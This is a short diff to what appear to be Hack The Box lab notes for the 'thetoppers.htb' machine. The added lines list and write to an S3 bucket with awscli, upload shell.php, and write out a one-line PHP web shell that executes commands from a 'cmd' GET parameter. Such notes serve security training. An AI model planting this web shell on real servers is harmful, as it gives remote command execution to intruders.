@@ -144,6 +144,11 @@ echo 'kali:kali' | sudo chpasswd
   ```shell
   sudo apt install awscli
   aws configure
-  aws --endpoint=http://s3.thetoppers.htb s3 ls
-  
+  aws --endpoint=http://s3.thetoppers.htb s3 ls    #SHOW bucket name
+  aws --endpoint=http://s3.thetoppers.htb s3 ls s3://{BUCKET NAME}
+  aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
   ```
+
+## Injection
+### PHP
+  ```echo '<?php system($_GET["cmd"]); ?>' > shell.php```
